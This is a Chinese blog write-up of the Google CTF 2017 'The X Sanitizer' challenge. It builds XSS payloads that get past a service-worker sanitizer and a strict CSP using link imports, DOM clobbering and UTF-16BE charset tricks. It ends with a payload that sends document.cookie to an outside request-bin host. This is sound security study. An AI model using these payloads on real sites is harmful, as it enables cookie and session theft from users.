---
author: 宾狗
date: 2017-06-10 17:45+08:00
layout: post
title: "编码的妙用——GCTF2017中The X Sanitizer题解"
description: ""
mathjax: true
categories:
- 工程
tags:
- 安全
---

* content
{:toc}


## 0x00 背景

在今年的Google CTF 2017中，有这样的一道题目The X Sanitizer，大概长这个样子，

![The X Sanitizer.png](http://ac-cf2bfs1v.clouddn.com/d9820c46c06f75f57265.png)

我复现了这个[**环境**](https://bindog.github.io/txs/the_x_sanitizer.html)，感兴趣的同学可以自己来试试，看看能否弹窗~(注意路径哦，和本文后面的解答略有不同)






题目很简单直白，就是让我们构造一段XSS Payload，绕过`The X Sanitizer`设置的层层过滤

## 0x01 初步分析

查看网页源码，首先是非常显眼的CSP策略

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

这是一个非常严格的策略，意味着我们只能加载同源的脚本、图片等资源

然后该页面加载了两个js文件，`main.js`和`sanitizer.js`，`main.js`如下

```js
if (document.cookie.indexOf('flag=') === -1) document.cookie = 'flag=test_fl46'; // For testing
window.addEventListener("load", function() {
  // Main program logic
  var input = document.getElementById('input');
  var output_text = document.getElementById('output_text');
  var output_render = document.getElementById('output_render');
  var hash = location.hash.slice(1) || 'This is the <s>perfect</s><b>best</b>\n' +
      '<script>alert(document.domain);</script>\n' +
      '<i>HTML sanitizer</i>.\n' +
      '<script src="https://example.com"></script>';
  input.value = decodeURIComponent(hash);
  function render() {
    var html = input.value;
    location.hash = encodeURIComponent(html);
    sanitize(html, function (html){
      output_render.innerHTML = html;
      output_text.textContent = html;
    });
  }
  document.getElementById('render').addEventListener("click", render);
  render();

  document.getElementById('submit').addEventListener("click", function() {
    location = '/submit.html?html=' + encodeURIComponent(input.value)
  });
});
```

这段代码逻辑比较简单，主要是给页面中的两个按钮绑定点击事件，其中关键的函数`sanitize`在另一个文件`sanitizer.js`中，如下

```js
function sanitize(html, callback) {
  if (!window.serviceWorkerReady) serviceWorkerReady = new Promise(function(resolve, reject) {
    if (navigator.serviceWorker.controller) return resolve();
    navigator.serviceWorker.register('sanitizer.js')
        .then(reg => reg.installing.onstatechange = e => (e.target.state == 'activated') ? resolve() : 0);
  });
  while (html.match(/meta|srcdoc|utf-16be/i)) html = html.replace(/meta|srcdoc|utf-16be/i, ''); // weird stuff...
  serviceWorkerReady.then(function() {
    var frame = document.createElement('iframe');
    frame.style.display = 'none';
    frame.src = '/sandbox?html=' + encodeURIComponent(html);
    document.body.appendChild(frame);
    addEventListener('message', function listener(msg) {
      if (msg.source != frame.contentWindow || msg.origin != location.origin) return;
      document.body.removeChild(frame);
      removeEventListener('message', listener);
      callback(msg.data);
    });
  });
}

addEventListener('install', e => e.waitUntil(skipWaiting()));
addEventListener('activate', e => e.waitUntil(clients.claim()));
addEventListener('fetch', e => e.respondWith(clients.get(e.clientId).then(function(client) {
  var isSandbox = url => (new URL(url)).pathname === '/sandbox';
  if (client && isSandbox(client.url)) {
    if (e.request.url === location.origin + '/sanitize') {
      // Branch A
      return new Response(`
        onload = _=> setTimeout(_=> parent.postMessage(document.body.innerHTML, location.origin), 1000);
        remove = node => (node == document) ? document.body.innerHTML = '' : node.parentNode.removeChild(node);
        document.addEventListener("securitypolicyviolation", e => remove(e.target));
        document.write('<meta http-equiv="Content-Security-Policy" content="default-src \\'none\\'; script-src *"><body>');
      `);
    } else {
      // Branch B
      // Violation events often don't point to the violating element, so we need this additional logic to track them down.
      // This is also important from marketing perspective. Do not remove or simplify this logic.
      return new Response(`
        with(document) remove(document === currentScript.ownerDocument ? currentScript : querySelector('link[rel="import"]'));
        // <script src=x></script>
      `);
    }
  } else if (isSandbox(e.request.url)) {
    // Branch C
    return new Response(
      '<!doctype HTML>\n<script src=sanitize>\n</script>\n<body>' + decodeURIComponent(e.request.url.split('?html=')[1]),
      {headers: new Headers({'X-XSS-Protection': '0', 'Content-Type': 'text/html'})}
    );
  } else {
    // Branch D
    return fetch(e.request);
  }
})));
```

其实这段代码中的注释已经给了很多的hint，比如第7行代码最后的注释已经暗示了考点之一是`utf-16be`编码，暂时按下不表，我们先捋一捋代码的逻辑。这段代码将`sanitizer.js`注册为一个Service worker，什么是Service worker？来看一下定义：

> Service worker是一个注册在指定源和路径下的事件驱动worker。它采用JavaScript控制关联的页面或者网站，拦截并修改访问和资源请求，细粒度地缓存资源。

在Service worker的`FetchEvent`中，通过使用`FetchEvent.respondWith`方法，可以任意修改对于这些请求的响应，也就是说响应我们请求的不一定是真实的服务器，而有可能是这个Service worker。其实这里的`sanitizer.js`通过拦截请求，并根据情况进行响应，相当于一个沙盒的作用

我们通过调试来看看输入是怎样被处理的，假设我们输入的是`<script src='https://heihei.com'></script>`，那么处理流程如下：

1. 输入内容经过url编码后，前面拼接上`/sandbox?html=`，并作为一个请求发出，此时访问的是`/sandbox?html=`链接，进入`Branch C`分支，返回的内容如下

```html
<!doctype HTML>
<script src=sanitize>
</script>
<body><script src='https://heihei.com'></script>
```

此时进入沙盒内部，产生两个请求，分别为`https://sanitizer.web.ctfcompetition.com/sanitize`和`https://heihei.com/`

2. 第一个请求进入`Branch A`分支，返回内容如下

```html
onload = _=> setTimeout(_=> parent.postMessage(document.body.innerHTML, location.origin), 1000);
remove = node => (node == document) ? document.body.innerHTML = '' : node.parentNode.removeChild(node);
document.addEventListener("securitypolicyviolation", e => remove(e.target));
document.write('<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; script-src *"><body>');
```

这里也设置了一个CSP策略，除了脚本以外不允许引入其他任何资源，违反该策略的元素将直接被移除，但是对脚本的域没有作限制

3. 第二个请求进入`Brach B`分支，返回内容如下

```js
with(document) remove(document === currentScript.ownerDocument ? currentScript : querySelector('link[rel="import"]'));
// <script src=x></script>
```

这里判断当前元素是否为script，如果是的话就移除，否则就移除一个匹配`<link rel="import">`的link元素

将上述过程画成一张图，看起来条理更清楚一点

![code_logic.png](http://ac-cf2bfs1v.clouddn.com/97ae611a459c1f173f53.png)

可以看到整个过程中所有的请求都是由Service worker响应的，所以想引入外部的恶意脚本几乎是不可能的。搞清楚代码的逻辑之后，我们可以着手构造payload了，其实核心问题就两个

1. 绕过沙盒中的过滤
2. 搞定CSP

## 0x02绕过沙盒

前面说到，在沙盒中也有一个CSP策略，而这个策略对脚本的域是没有做限制的，因此我们可以使用`<script>`或`<link rel="import">`两种方式引入我们控制的脚本。但是使用script的话就会将自己移除，这样是行不通的。但是使用`<link rel="import" href="http://heihei.com">`也是存在问题的，注意看第38行代码

```js
with(document) remove(document === currentScript.ownerDocument ? currentScript : querySelector('link[rel="import"]'));
```

这行代码会将我们的link标签移除掉，看似走进了一条死路，但是仔细观察可以发现`querySelector('link[rel="import"]')`仅会匹配第一个符合条件的link标签，也就是说如果我们插入多个link标签只有第一个标签会被移除。

```js
<link rel="import"><link rel="import" href="https://heihei.com">
```

这样第二个link标签即可保留下来

这里还有另外一种解决方案，利用`DOM Clobbering`方式，构造这样一个payload

```html
<img name=remove><link rel=import href='https://heihei.com'>
```

这样脚本中重复定义了`remove`，执行时会报错`remove`不是一个函数，最后并没有执行，从而保留住了link标签

![dom_clobbering.png](http://ac-cf2bfs1v.clouddn.com/289ea9f52dbafecf6aae.png)

这样第一个问题解决了，我们将该payload输入到文本框，点击按钮，这时注意看console中的错误信息，由于违反了主页中的CSP策略，我们的脚本是无法加载的。

![csp.png](http://ac-cf2bfs1v.clouddn.com/9ae8ec7eee050083923c.png)

## 0x03 搞定CSP

如何解决这第二个问题呢？既然主页的CSP策略非常严格，我们只能从其同源的页面入手，而同源的页面且受我们控制的只有下面这个请求了：

![sandbox_request.png](http://ac-cf2bfs1v.clouddn.com/0bad02f853411f08b64a.png)

```js
https://sanitizer.web.ctfcompetition.com/sandbox?html=%3Clink%20rel%3D%22import%22%3E%3Clink%20rel%3D%22import%22%20href%3D%22https%3A%2F%2Fheiheihei.com%2Fpwn.html%22%3E
```

其响应为

```html
<!doctype HTML>
<script src=sanitize>
</script>
<body><link rel="import"><link rel="import" href="https://heiheihei.com/pwn.html">
```

其中`sandbox?html=`之后的内容是我们可控的，那是不是可以构造这样一个payload呢

```html
<!--
<link rel="import"><link rel="import" href="/sandbox?html=<script>alert(1)</script>">
-->
<link rel="import"><link rel="import" href="/sandbox?html=%3cscript%3ealert(1)%3c%2fscript%3e">
```

很遗憾，虽然我们成功的插入了`script`元素，但是由于CSP策略限制，`inline`形式的脚本是无法执行的

![inline_script.png](http://ac-cf2bfs1v.clouddn.com/566a403f55f1b79e4f2a.png)

不过我们稍微修改一下payload，以`src`形式加载一个可控脚本进来即可绕过，无非是多请求一次而已，如下

```html
<!--
<link rel="import"><link rel="import" href="/sandbox?html=<script src='/sandbox?html=<script>alert(1)</script>'></script>">
-->
<link rel="import"><link rel="import" href="/sandbox?html=%3cscript%20src%3d%27%2fsandbox%3fhtml%3d%3cscript%3ealert(1)%3c%2fscript%3e%27%3e%3c%2fscript%3e">
```

再来看看结果

![invalid_js.png](http://ac-cf2bfs1v.clouddn.com/f16c4efe55c7fc9daafc.png)

依然不行，以`src`形式加载脚本的话，响应并非一个有效的脚本文件，前面被强行插入了`<!doctype HTML>`等代码片段，报了语法错误

## 0x04 神奇的编码

这样一来似乎所有可行的方式都被pass掉了，下面该如何入手呢？别忘了刚才提到的诡异的`utf-16be`，`script`还有一个经常被大家忽视的属性`charset`，是不是可以在`charset`上做做文章呢？这里稍微在网上查查就可以找到一些资料：

- [JSON hijacking minichallenge](http://vwzq.net/challenge/jsonhijack.html)
- [UTF-16によるContent Security Policyの迂回](http://masatokinugawa.l0.cm/2012/05/utf-16content-security-policy.html)

需要满足的条件是目标内容在http响应头中没有指定编码，这样我们就可以在`script`的`charset`中指定一个编码，并让目标内容按我们指定的编码进行解析，把原有的不受我们控制的内容“吃掉”，从而达到绕过的目的。

那么为什么选用`utf-16be`编码呢？我们写个脚本观察分别用`utf-16be`和`utf-16le`解析得到的结果

```js
function thex(charCode){
	r = charCode.toString(16);
	if(r.length == 1)
		return '0'+r
	return r
}
function utf16be(HTMLString){
    var line = ''
    for(var i=0;i<HTMLString.length/2;i++){
    	raw = HTMLString.charAt(2*i) + HTMLString.charAt(2*i+1)
    	out = '\\u'+ thex(HTMLString.charCodeAt(2*i)) + thex(HTMLString.charCodeAt(2*i+1))
    	line += raw.replace('\n','\\n') + '\t' + out + '\t' + unescape(out.replace('\\u','%u')) + '\n'
    }
    return line
}
function utf16le(HTMLString){
    var line = ''
    for(var i=0;i<HTMLString.length/2;i++){
    	raw = HTMLString.charAt(2*i) + HTMLString.charAt(2*i+1)
    	out = '\\u'+ thex(HTMLString.charCodeAt(2*i+1)) + thex(HTMLString.charCodeAt(2*i))
    	line += raw.replace('\n','\\n') + '\t' + out + '\t' + unescape(out.replace('\\u','%u')) + '\n'
    }
    return line
}
var tcode = '<!doctype HTML>\n'+'<script src=sanitize>\n'+'<\/script>\n'+'<body>';
console.log(utf16be(tcode))
console.log(utf16le(tcode))
```

其中`utf-16be`解析结果如下

```
<!	\u3c21	㰡
do	\u646f	摯
ct	\u6374	捴
yp	\u7970	祰
e 	\u6520	攠
HT	\u4854	䡔
ML	\u4d4c	䵌
>\n	\u3e0a	㸊
<s	\u3c73	㱳
cr	\u6372	捲
ip	\u6970	楰
t 	\u7420	琠
sr	\u7372	獲
c=	\u633d	挽
sa	\u7361	獡
ni	\u6e69	湩
ti	\u7469	瑩
ze	\u7a65	穥
>\n	\u3e0a	㸊
</	\u3c2f	㰯
sc	\u7363	獣
ri	\u7269	物
pt	\u7074	灴
>\n	\u3e0a	㸊
<b	\u3c62	㱢
od	\u6f64	潤
y>	\u793e	社
```

`utf-16le`的解析结果如下

```
<!	\u213c	ℼ
do	\u6f64	潤
ct	\u7463	瑣
yp	\u7079	灹
e 	\u2065	⁥
HT	\u5448	呈
ML	\u4c4d	䱍
>\n	\u0a3e	ਾ
<s	\u733c	猼
cr	\u7263	牣
ip	\u7069	灩
t 	\u2074	⁴
sr	\u7273	牳
c=	\u3d63	㵣
sa	\u6173	慳
ni	\u696e	楮
ti	\u6974	楴
ze	\u657a	敺
>\n	\u0a3e	ਾ
</	\u2f3c	⼼
sc	\u6373	捳
ri	\u6972	楲
pt	\u7470	瑰
>\n	\u0a3e	ਾ
<b	\u623c	戼
od	\u646f	摯
y>	\u3e79	㹹
```

很显然，`utf-16le`解析得到的结果中存在很多无效字符，如果留在脚本文件中依然会报语法错误，而`utf-16be`的解析结果则恰好都为有效字符。所以这里选择`utf-16be`编码，不过`sanitizer.js`中把`utf-16be`过滤掉了，我们只要把其中一个字符换成URL编码形式即可绕过，如`utf-1%36be`，后续过程中会把它解码回来

按`utf-16be`编码规范对我们的payload进行修改

```html
<!--
<link rel="import"><link rel="import" href="/sandbox?html=<script charset="utf-1%36be" src="sandbox?html=%00%3D%001%00%3B%00a%00l%00e%00r%00t%00%28%001%00%29"></script>">
-->
<link rel="import"><link rel="import" href="/sandbox?html=%3Cscript%20charset%3D%22utf-1%36be%22%20src%3D%22sandbox%3Fhtml%3D%2500%253D%25001%2500%253B%2500a%2500l%2500e%2500r%2500t%2500%2528%25001%2500%2529%22%3E%3C/script%3E">
```

再次提交我们的结果，此时成功的弹窗，观察最后那个关键的请求

![utf-16be.png](http://ac-cf2bfs1v.clouddn.com/ab9f93794817e11f7710.png)

从图中可以看到，由于我们指定了编码，因此前面那些被附加上的内容全部按`utf-16be`编码进行解析，和我们刚才分析的结果一致，在脚本中可以将其视为一个变量名，我们将该语句补充完整，然后即可执行我们附加的代码

现在所有障碍都已绕过，可以构造最终的payload了。

## 0x05 GetFlag

为了方便起见，写一个函数对我们的payload进行编码，如下所示

```js
function gen_payload(e){
	var out = '';
	for(var i = 0; i < e.length; i++){
		out += '\u0000'+e[i];
	}
	out = escape(out);
	var a = "<script charset=\"utf-16be\" src=\"sandbox?html="+out+"\"><\/script>";
	console.log(a);
	a = escape(a).replace('utf-16be','utf-1%36be');

	return a;
}
gen_payload('=1; location.href="https://requestb.in/1447b711?inspect?" + escape(document.cookie);');
```

编码后如下

```html
<link rel="import"><link rel="import" href="/sandbox?html=%3Cscript%20charset%3D%22utf-1%36be%22%20src%3D%22sandbox%3Fhtml%3D%2500%253D%25001%2500%253B%2500%2520%2500l%2500o%2500c%2500a%2500t%2500i%2500o%2500n%2500.%2500h%2500r%2500e%2500f%2500%253D%2500%2522%2500h%2500t%2500t%2500p%2500s%2500%253A%2500/%2500/%2500r%2500e%2500q%2500u%2500e%2500s%2500t%2500b%2500.%2500i%2500n%2500/%25001%25004%25004%25007%2500b%25007%25001%25001%2500%253F%2500i%2500n%2500s%2500p%2500e%2500c%2500t%2500%253F%2500%2522%2500%2520%2500+%2500%2520%2500e%2500s%2500c%2500a%2500p%2500e%2500%2528%2500d%2500o%2500c%2500u%2500m%2500e%2500n%2500t%2500.%2500c%2500o%2500o%2500k%2500i%2500e%2500%2529%2500%253B%22%3E%3C/script%3E">
```

提交之后等待结果，最后接收到`flag`

![flag.png](http://ac-cf2bfs1v.clouddn.com/425ce1dece8a618bf833.png)

收工~

## 0x06 总结

Web应用中的编码历来都是问题的多发地，无论是曾经IE中的`utf-7`编码问题，MySQL宽字节注入以及利用编码绕过WAF等等。可以说，只要涉及到数据的传递和流动，就必然涉及到编码转换，而只要有编码不统一的地方，就有可能存在漏洞，这一点，无论对攻击者或防御者都需要注意。

## 0x07 参考资料

- https://l4w.io/2017/06/google-ctf-the-x-sanitizer-%E2%80%92-writeup/
- https://kitctf.de/writeups/googlectf/x-sanitizer
- [JSON hijacking minichallenge](http://vwzq.net/challenge/jsonhijack.html)
- [UTF-16によるContent Security Policyの迂回](http://masatokinugawa.l0.cm/2012/05/utf-16content-security-policy.html)
